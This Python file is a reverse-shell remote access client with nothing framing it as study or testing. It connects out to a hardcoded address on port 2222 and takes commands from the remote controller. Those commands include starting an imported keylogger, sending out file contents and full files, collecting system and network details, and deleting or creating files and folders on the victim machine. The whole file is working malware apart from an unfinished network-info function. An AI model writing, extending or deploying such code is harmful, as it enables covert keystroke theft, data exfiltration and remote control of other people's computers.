import socket as st
import os
import shutil
import platform
import psutil
import stat
import sys
from keylogging import *
from keylogging import keylogger
# from colorama import Fore, Style

def get_network_infos():
    for no, interface, addrs in enumerate(psutil.net_if_addrs().items()):
        return f"""
        Interface {no+1}
        Interface name : {interface}
        IP address : {addrs.address}
        MAC address : {''}
        """
    #RESUME FROM THIS 

def get_system_information():
    if platform.system() == 'Windows':
        getBuildNumber = int(platform.version().split('.')[2])
        if getBuildNumber < 22000:
            os_name = 'Windows 10'
        elif getBuildNumber >= 22000:
            os_name = 'Windows 11'
        else:
            os_name = 'Windows'

    curr_ram = psutil.virtual_memory().total // pow(1024,3)
    return """
    {}\n
    Device name : {}
    System : {}
    OS version : {}
    Architecture : {}
    Machine : {}
    Processor : {}
    Core : {}
    Battery : {}%\n\n
    {}\n
    Disk Usage : {}
    Disk partitions : {}
    RAM : {}
    CPU usage : {}\n\n
    {}
    {}\n
    """.format(
        'SYSTEM INFORMATION'.center(150),
        os_name,
        platform.node(),
        platform.version(),
        platform.architecture(),
        platform.machine(),
        platform.processor(),
        os.cpu_count(),
        psutil.sensors_battery(),
        'DISK INFORMATION'.center(150),
        psutil.disk_usage(os.getcwd()),
        psutil.disk_partitions(),
        curr_ram,
        psutil.cpu_percent(),
        'NETWORK INFORMATION'.center(150),
        get_network_infos()
    ).encode()

def create_thing(get_cmd,sock):
    cmd = get_cmd.split()
    file_type = cmd[1]
    if file_type == 'file':
        if cmd[2] and cmd[3]:
            try:
                file_name = str(cmd[2])
                getposes = []

                for pos,arg in enumerate(cmd):
                    if '"' in arg:
                        getposes.append(pos)

                f_content = ''
                for _content in range(getposes[0],getposes[1]+1):
                    f_content += cmd[_content] + ' '
                
                with open(file_name,'w') as wfile:
                    wfile.write(f_content.replace('"',''))
                    sock.send(f'The file \'{file_name}\' created and content written'.encode())
                wfile.close()
            except Exception as err:
                sock.send(str(err).encode())  
                  
        elif cmd[2] and not cmd[3]:
            try:
                with open(cmd[2],'w') as wfile:
                    wfile.write('')
                    sock.send(f'The file \'{cmd[2]}\' created'.encode())
                wfile.close()
            except Exception as err:
                sock.send(str(err).encode())
        else:
            sock.send('Syntax : touch file <file_name>'.encode())   
    
    elif file_type == 'folder':
        if cmd[2]:
            try:
                os.makedirs(cmd[2])
                sock.send('the file \'{}\' created at target successfully'.format(cmd[2]).encode())
            except Exception as err:
                sock.send(str(err).encode())
        else:
            sock.send('Syntax : touch folder <folder_name>'.encode())

    else:
        sock.send('''   
            Usage : 
                  touch file <file_name> - To create file in the target system.
                  touch folder <folder_name> - To create folder in the target system.
        '''.encode())

def main_root():
    sock = st.socket(st.AF_INET, st.SOCK_STREAM)
    sock.connect(('192.168.6.32',2222))

    while True:
        sock.send(os.getcwd().encode())
        get_cmd = sock.recv(1024).decode().strip()
        if not get_cmd:  
            print("Connection closed by server.")
            break 

        try:
            if get_cmd.startswith('cd '):  
                _dir = get_cmd.split(maxsplit=1)[1]  
                os.chdir(_dir)
                sock.send('\n'.encode())

            elif get_cmd == 'clear':
                continue

            elif get_cmd == 'log keys':
                try:
                    keylogger(sock)
                except Exception as err:
                    continue

            elif get_cmd in ('exit','quite'):
                sock.close()
                sys.exit()

            elif get_cmd.startswith('touch '):
                create_thing(get_cmd,sock)

            elif get_cmd == 'sysinfo':
                sock.send(get_system_information())

            elif get_cmd.startswith('which '):
                get_exec = get_cmd.split()[1]
                get_exec_loc = shutil.which(get_exec)
                sock.send(get_exec_loc.encode())

            elif get_cmd.startswith('rm '):
                file_name = get_cmd.split()[1]
                if os.path.exists(file_name):
                    os.chmod(file_name,stat.S_IWRITE)
                    os.remove(file_name)
                    sock.send('The file \'{}\' removed successfully'.format(file_name).encode())
                else:
                    sock.send('The file \'{}\' doesnt exist'.format(file_name).encode())

            elif get_cmd.startswith('rmdir '):
                folder_name = get_cmd.split()[1]
                if os.path.exists(folder_name):
                    os.chmod(folder_name,stat.S_IWRITE)
                    shutil.rmtree(folder_name)
                    sock.send('The folder \'{}\' removed successfully'.format(folder_name).encode())
                else:
                    sock.send('The folder \'{}\' doesnt exist'.format(folder_name).encode())

            elif get_cmd == 'ls':
                _dir = os.getcwd()
                files = '\n'.join(os.listdir(_dir))
                sock.sendall(files.encode() + b'\n')
            
            elif get_cmd.startswith('cat '):  # Read and send file contents
                file_path = get_cmd.split()[1]
                if os.path.exists(file_path) and os.path.isfile(file_path):
                    with open(file_path, "r") as f:
                        sock.sendall(f.read().encode())
                else:
                    sock.send(b"Error: File not found\n")

            elif get_cmd.startswith('download '):  
                try:
                    dfile = '{}/{}'.format(os.getcwd(),get_cmd.split()[1])
                    if os.path.isfile(dfile):
                        with open(dfile,'rb') as file:
                            sock.sendfile(file)
                        sock.shutdown(st.SHUT_WR)
                        file.close()
                    else:
                        sock.send('{} is not a file'.format(dfile).encode())
                except Exception as e:
                    sock.send(str(e).encode())


            elif get_cmd in ('pwd', 'cwd'):  
                sock.send(os.getcwd().encode() + b"\n")

            else:
                sock.send('Invalid command found : {}'.format(get_cmd).encode())

        except Exception as err:
            sock.send(str(err).encode())
            continue
        
        except ConnectionResetError:
            sock.close()
            break

    sock.close()
